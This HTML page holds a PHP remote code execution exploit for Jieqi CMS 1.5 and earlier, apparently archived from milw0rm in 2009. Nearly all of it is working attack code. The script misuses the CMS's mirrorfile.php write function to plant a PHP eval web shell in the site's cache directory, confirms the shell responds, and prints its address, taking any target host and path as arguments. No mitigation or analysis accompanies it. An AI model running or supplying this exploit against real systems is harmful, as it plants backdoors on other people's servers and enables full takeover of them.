<html><head><title>Jieqi CMS <= 1.5 Remote Code Execution Exploit</title></head><pre>&lt;?php
print_r('
+---------------------------------------------------------------------------+
Jieqi cms &lt;= 1.5 remote code execution exploit
by Securitylab.ir
mail: secu_lab_ir@yahoo.com
+---------------------------------------------------------------------------+
');
/**
* works regardless of php.ini settings
*/
if ($argc &lt; 3) {
    print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path
host:      target server (ip/hostname)
path:      path to jieqi cms
Example:
php '.$argv[0].' localhost /
+---------------------------------------------------------------------------+
');
    exit;
}
error_reporting(7);
ini_set('max_execution_time', 0);
$host = $argv[1];
$path = $argv[2];
$url = 'http://'.$host.$path.'mirrorfile.php?filename=cache/seculab.php&amp;action=writetofile&amp;content=';
$shell = 'http://'.$host.$path.'cache/seculab.php';
$cmd = urlencode(&quot;&lt;?php @eval(\$_POST[hamed]);?&gt;test&quot;);
$str = file_get_contents($url.$cmd);
if ( file_get_contents($shell) == 'test')
exit(&quot;Expoilt Success!\nView Your shell:\t$shell\n&quot;);
else
exit(&quot;Exploit Failed!\n&quot;);
?&gt;

# milw0rm.com [2009-05-18]</pre></html>